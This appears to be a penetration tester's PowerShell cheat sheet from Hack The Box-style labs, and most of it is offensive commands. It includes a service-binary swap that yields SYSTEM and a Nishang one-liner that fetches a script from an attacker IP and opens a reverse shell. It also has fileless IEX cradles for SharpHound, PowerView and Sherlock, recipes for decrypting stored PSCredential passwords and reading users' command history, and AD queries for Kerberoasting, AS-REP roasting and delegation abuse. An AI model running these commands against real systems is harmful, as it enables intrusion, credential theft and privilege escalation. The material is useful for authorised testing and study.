# PowerShell

## Importing Module
```
Import-Module <name of ps1>
```

## Checking Services
```
get-service AdvancedSystemCareService9
stop-service AdvancedSystemCareService9
start-service AdvancedSystemCareService9

powershell -c get-service AdvancedSystemCareService9
powershell -c stop-service AdvancedSystemCareService9
powershell -c start-service AdvancedSystemCareService9
```

## Invoke-WebRequest
```
c:/> Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c start-service AdvancedSystemCareService9

WOOTWOOT
c:\Windows\system32>whoami
nt authority\system
```

## New-Object System.Net.WebClient (alternate download method)
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/shell.exe','shell.exe')"
```

## Nishang Shell (Running PS1 without saving to disk)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.3.85 -Port 443
```

## Fileless (Running PS1 without saving to disk)
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1')
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
```

## Fileless (Run and Execute)
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.19:8000/Sherlock.ps1') | powershell -noprofile - 
```

## Running Executable
```
c:\> start-process shell.exe
c:\> .\shell.exe
```

## Searching for files names with PowerShell
```
Get-Childitem –Path C:\ -Include *search-string* -File -Recurse
```

 ## Decoding Base64
 ```
 $string = "some-base64 aksdjklasd=="
 [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($string))
  ```

## Reading Users PowerShell History
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Decoding .PSCredential

[url] https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>

$tom_credential = Import-CliXml -Path .\cred.xml
$tom_credential.GetNetworkCredential().Password
```

## Create Credential Object
[URL] https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2
```
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" |convertTo-SecureString

$user = "HTB\Tom"

$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```

## Return Password from $Cred
```
PS $cred.GetNetworkCredential().Password
```

## Search all files for keyword
```
type * | findstr "password"
```

## Check for Antivirus
```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-Service WinDefend
```

## Is RealTimeProtectionEnabled
```
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

## Checking PowerShell History
Powershell.exe does not recognize or use the %% reference, so need to use env variables

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (cmd.exe)
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (powershell.exe)
```

## Get List of Installed Software
```
get-ciminstance win32_product | fl
```

## Get a list of Installed Software (exclude Microsoft)
```
get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl
```

## Get-ADUser
All three are valid syntaxes

```
`Get-ADUser -Filter "name -eq 'sally jones'"`
`Get-ADUser -Filter {name -eq 'sally jones'}`
`Get-ADUser -Filter 'name -eq "sally jones"'`
```

## Get-ADUser (wildcard for any user name with joe)
```
Get-ADUser -filter {-name -like "joe*"}
```

## Get-ADComputer (filter for hostnames with SQL)
```
Get-ADComputer -Filter "DNSHostName -like 'SQL*'"
```

## Get-ADGroup (filter for admin users)
```
Get-ADGroup -Filter "adminCount -eq 1" | select Name
```

## Get-ADUser (DoesNotRequirePreAuth) ASRepRoasting on Admin accounts
```
Get-ADUser -filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}
```

## Get-ADUser (with servicePrincipalName) can likely be Kerberoasted
```
Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl
```

## Get-ADUser (search descrption field) - can contain passwords
```
Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description
```

## Get-ADUser (TrustedForDelegation)
```
Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select Name,memberof, servicePrincipalName,TrustedForDelegation | fl
```

## Get-ADComputer (TrustedForDelegation)
```
Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl
```

## Get-ADUser (Users, in this case Admins, allowing blank password)
```
Get-AdUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl
```

## Get-ADGroupMember (of "Security Operations" group)
```
Get-ADGroupMember -Identity "Security Operations"
```

## Get-ADGroupMember (recursive search for all groups, of a member)
```
Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL"' | select name
```

## Get-ADUser (count of all users in Employees/IT OU structure)
```
(Get-ADUser -SearchBase "OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope Subtree -Filter *).count
```

## Escape Characters
| Character | Escaped As | Note |
| ---------------------------- | ---------------------------- | ---------------------------- |
| " | \\" | Only needed if the data is enclosed in double-quotes |
| ' | \\' | Only needed if the data is enclosed in single-quotes |
| NUL | \00 | Standard LDAP escape sequence |
| \ | \5c | Standard LDAP escape sequence |
| * | \2a | Escaped automatically, but only in -eq and -ne. Use -like and -notlike for wildcard comparison |
| () | 28 | Escaped automatically |
| ) | 29 | Escaped automatically |
| / | /2f | Escaped automatically |



## PowerShell Operators
| Filter | Meaning |
| ---------------------------- | ---------------------------- |
| -eq	| Equal to |
| -le	| Less than or equal to |
| -ge	| Greater than or equal to |
| -ne	| Not equal to |
| -lt	| Less than |
| -gt	| Greater than |
| -approx | Approximately equal to |
| -bor | Bitwise OR |
| -band	| Bitwise AND |
| -recursivematch	| Recursive match |
| -like | Like |
| -notlike| Not Like |
| -and| Boolean AND |
| -or	| Boolean OR |
| -not |Boolean NOT |
